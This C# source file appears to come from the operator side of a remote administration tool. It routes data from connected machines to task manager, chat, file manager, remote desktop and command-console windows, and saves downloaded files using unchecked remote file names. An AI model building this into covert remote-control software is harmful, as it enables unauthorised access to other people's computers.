using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.IO;
using System.Windows.Forms;

namespace Art_RMS.Forms
{
    class Functions
    {
        public static void Fun_Task_Manager(int ID_User, List<Array> cmd)
        {
            foreach (Form Frm in Listener.Forms)
                if (Convert.ToInt32(Frm.Tag) == ID_User && Frm.Name.Contains("Dialog_Task_Manager"))
                {
                    var form = (Dialog_Task_Manager)Frm;
                    form.Fill_Table(cmd);
                }
        } //Заполнение Диспетчера задач

        public static void Get_Message_From_User(int ID_User, string cmd)
        {
            foreach (Form Frm in Listener.Forms)
                if (Convert.ToInt32(Frm.Tag) == ID_User && Frm.Name.Contains("Dialog_Chat"))
                {
                    var form = (Dialog_Chat)Frm;
                    form.Received(cmd);
                }
        } // Заполнение чата

        public static void Func_File_Manager(int ID_User, List<Array> cmd)
        {
            foreach (Form Frm in Listener.Forms)
                if (Convert.ToInt32(Frm.Tag) == ID_User && Frm.Name.Contains("Dialog_File_Manager"))
                {
                    var form = (Dialog_File_Manager)Frm;
                    form.Received(cmd);
                }

        } //Заполнение файлового менеджера

        public static void Get_Desktop_Screen(int ID_User, byte[] picture)
        {
            foreach (Form Frm in Listener.Forms)
                if (Convert.ToInt32(Frm.Tag) == ID_User && Frm.Name.Contains("Dialog_Remote_Desktop"))
                {
                    var form = (Dialog_Remote_Desktop)Frm;
                    form.Response(picture);
                    return;
                }
            new Listener().Send(ID_User, "STOP_REMOTE_DESKTOP|");
        }

        public static void Write_File(byte[] file, string name)
        {
            if (!Directory.Exists("Downloads"))
                Directory.CreateDirectory("Downloads");
            File.WriteAllBytes("Downloads\\" + name, file);
        }

        public static void Response_Command(int ID_User, string Response)
        {
            foreach (Form Frm in Listener.Forms)
                if (Convert.ToInt32(Frm.Tag) == ID_User && Frm.Name.Contains("Dialog_cmd"))
                {
                    var form = (Dialog_cmd)Frm;
                    form.Received(Response);
                }
        }

    }
}
